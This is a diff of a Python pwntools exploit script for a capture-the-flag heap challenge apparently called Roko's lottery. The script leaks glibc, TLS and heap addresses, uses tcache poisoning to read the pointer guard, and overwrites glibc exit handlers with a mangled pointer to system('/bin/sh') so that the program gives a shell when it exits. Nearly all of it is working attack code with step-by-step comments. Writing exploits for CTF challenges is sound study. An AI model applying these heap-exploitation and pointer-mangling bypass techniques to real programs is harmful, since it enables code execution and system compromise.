@@ -18,101 +18,93 @@ p = gdb.debug('./lottery_patched', '''
 # p = remote('rokos-lottery.aws.jerseyctf.com', 5000)
 
 def attempt_ticket(size):
-    p.sendlineafter(b'Enter your lucky number: ', b'1')
-    p.sendlineafter(b'Enter your lucky number: ', str(size).encode())
+    p.sendlineafter(b"Enter your lucky number: ", b'1')
+    p.sendlineafter(b"Enter your lucky number: ", str(size).encode())
 
-def use_technique(technique):
-    p.sendlineafter(b'Enter your lucky number: ', b'2')
-    p.sendlineafter(b'Enter your lucky number: ', str(technique).encode())
-
-def burn_tickets(number, signatures, signs):
-    p.sendlineafter(b'Enter your lucky number: ', b'3')
+def burn_used_tickets(number, signatures, signs):
+    p.sendlineafter(b"Enter your lucky number: ", b'3')
     signatures_output = []
     for i in range(number):
         if signs[i]:
-            p.sendlineafter(b'sign it before you discard? ', b'y')
-            p.recvuntil(b'Sign your ticket before it flies away: ')
-            p.send(signatures[i])
-            p.recvuntil(b'You sign ')
-            signatures_output.append(p.recvuntil(b' as the ticket flies away...\n', drop=True))
+            p.sendlineafter(b"sign it before you discard? ", b'y')
+            p.sendafter(b"Sign your ticket before it flies away: ", signatures[i])
+            p.recvuntil(b"You sign ")
+            signatures_output.append(p.recvuntil(b" as the ticket flies away...\n", drop=True))
         else:
-            p.sendlineafter(b'sign it before you discard? ', b'n')
+            p.sendlineafter(b"sign it before you discard? ", b'n')
             signatures_output.append(b'NULL')
     return signatures_output
 
-def discard_ticket():
-    p.sendlineafter(b'Enter your lucky number: ', b'4')
-
 def scratch_ticket(name, jackpot=True, trip=False):
-    p.sendlineafter(b'Enter your lucky number: ', b'5')
+    p.sendlineafter(b"Enter your lucky number: ", b'5')
     if jackpot and not trip:
-        p.recvuntil(b'Your earnings:\n')
+        p.recvuntil(b"Your earnings:\n")
         earnings = []
         for _ in range(5):
-            earnings.append(p.recvline().strip())
+            earnings.append(p.recvline().strip()[1:])
         return earnings
     elif trip and not jackpot:
-        p.recvuntil(b'Please sign your name here: ')
-        p.send(name)
+        p.sendafter(b"Please sign your name here: ", name)
 
 def give_up():
-    p.sendlineafter(b'Enter your lucky number: ', b'6')
+    p.sendlineafter(b"Enter your lucky number: ", b'6')
 
-# Stage 1: Get glibc base address
-p.recvuntil(b'Here is last week\'s winning lottery number: ')
+def pointer_guard_encrypt(decrypted: int, pointer_guard: int):
+    r_bits = 0x11
+    max_bits = 64
+    encrypted = ((decrypted^pointer_guard)<<(r_bits%max_bits))&(2**max_bits-1)|(((decrypted^pointer_guard)&(2**max_bits-1))>>(max_bits-(r_bits%max_bits)))
+    return encrypted
+
+# attempt_ticket: malloc a chunks with a specific size
+# burn_used_tickets (based on whether to sign tickets): free all chunks in order from oldest malloced chunk to newest malloced chunk; if signature is chosen to be signed to a ticket, a string starting from address of chunk will leak
+# scratch_ticket (based on results from RNG): for first and second time calling this function, five values (-0x10, -8, 0, 8, 0x10) among address of newest malloced chunk can leak, which is called "jackpot"; for third and fourth time calling this function, 0x80 bytes from address of newest malloced chunk can be overwritten, which is called "trip"
+# give_up: exit program
+
+# Stage 1: get glibc base address, calculate tls base address, and set up provided seed for RNG
+p.recvuntil(b"Here is last week's winning lottery number: ")
 glibc_base_addr = int(p.recvline().strip().decode())-0x8cb30
-log.info(f'glibc base address: {hex(glibc_base_addr)}')
+log.info(f"glibc base address: {hex(glibc_base_addr)}")
+tls_base_addr = glibc_base_addr-0x28c0
+log.info(f"tls base address: {hex(tls_base_addr)}")
+p.sendlineafter(b"Enter your lucky number: ", str(647389).encode())
 
-# Stage 2: Set up seed for rng
-p.sendlineafter(b'Enter your lucky number: ', str(647389).encode())
-
-# Stage 3: Leak heap base address
+# Stage 2: leak heap base address using z3-solver
 attempt_ticket(0x18)
 attempt_ticket(0x18)
-heap_leaks = burn_tickets(2, [b'A', b'A'], signs=[True, True])
+heap_leaks = burn_used_tickets(2, [b'A', b'A'], signs=[True, True])
 heap_base = BitVec('heap_base', 64)
 s = Solver()
 s.add((heap_base+0x2c0>>12)>>8==u64(heap_leaks[0].ljust(8, b'\x00'))>>8)
 s.add(((heap_base+0x2e0>>12)^(heap_base+0x2c0))>>8==u64(heap_leaks[1].ljust(8, b'\x00'))>>8)
 s.check()
 heap_base_addr = s.model()[heap_base].as_long()
-log.info(f'heap base address: {hex(heap_base_addr)}')
+log.info(f"heap base address: {hex(heap_base_addr)}")
 
-# Stage 4: Leak rsp register value
+# Stage 3: leak pointer guard value using tcache poisoning
+# tcache poisoning
 attempt_ticket(0x28)
 attempt_ticket(0x28)
 glibc_e = ELF('./libc.so.6')
-burn_tickets(2, [p64(((heap_base_addr+0x300)>>12)^0), p64(((heap_base_addr+0x330)>>12)^(glibc_base_addr+glibc_e.symbols.environ+0x8))], signs=[True, True])
+burn_used_tickets(2, [p64(((heap_base_addr+0x300)>>12)^0), p64(((heap_base_addr+0x330)>>12)^(tls_base_addr+0x30))], signs=[True, True])
 attempt_ticket(0x28)
 attempt_ticket(0x28)
-environ_leaks = scratch_ticket(b'', jackpot=True, trip=False)
-rsp_value = int(environ_leaks[1].split(b'$')[1].decode())-0x248
-log.info(f'rsp value: {hex(rsp_value)}')
+pointer_guard_val = int(scratch_ticket(b'', jackpot=True, trip=False)[2])
+log.info(f"pointer guard value: {hex(pointer_guard_val)}")
 
-# Stage 5: Leak tls base address
-attempt_ticket(0x28)
-burn_tickets(2, [p64(((heap_base_addr+0x330)>>12)^0), p64(((heap_base_addr+0x360)>>12)^(rsp_value-0x20))], signs=[True, True])
-attempt_ticket(0x28)
-discard_ticket()
-attempt_ticket(0x28)
-tls_leaks = scratch_ticket(b'', jackpot=True, trip=False)
-tls_base_addr = int(tls_leaks[3].split(b'$')[1].decode())-0x3e8c0
-log.info(f'tls base address: {hex(tls_base_addr)}')
-
-# Stage 6: Attack exit functions
+# Stage 4: abuse exit handlers and bypass pointer mangle using tcache poisoning
+# move forward RNG
 attempt_ticket(0x38)
 attempt_ticket(0x38)
+scratch_ticket(b'', jackpot=True, trip=False)
+burn_used_tickets(2, [], signs=[False, False])
+# tcache poisoning
 attempt_ticket(0x48)
 attempt_ticket(0x48)
-burn_tickets(4, [p64(((heap_base_addr+0x390)>>12)^0), p64(((heap_base_addr+0x3d0)>>12)^(tls_base_addr+0x30)), p64(((heap_base_addr+0x410)>>12)^0), p64(((heap_base_addr+0x460)>>12)^(glibc_base_addr+0x212fd0))], signs=[True, True, True, True])
-attempt_ticket(0x38)
-attempt_ticket(0x38)
-scratch_ticket(p64(0), jackpot=False, trip=True)
+burn_used_tickets(2, [p64(((heap_base_addr+0x3e0)>>12)^0), p64(((heap_base_addr+0x430)>>12)^(glibc_base_addr+0x212fd0))], signs=[True, True])
 attempt_ticket(0x48)
 attempt_ticket(0x48)
-scratch_ticket(p64(0x4)+p64((glibc_base_addr+glibc_e.symbols.system)<<0x11)+p64(glibc_base_addr+next(glibc_e.search(b"/bin/sh"))), jackpot=False, trip=True)
-
-# Stage 7: Trigger exit functions
+scratch_ticket(p64(0x4)+p64(pointer_guard_encrypt(glibc_base_addr+glibc_e.sym.system, pointer_guard_val))+p64(glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00'))), jackpot=False, trip=True)
+# trigger system("/bin/sh\x00")
 give_up()
 
 p.interactive()
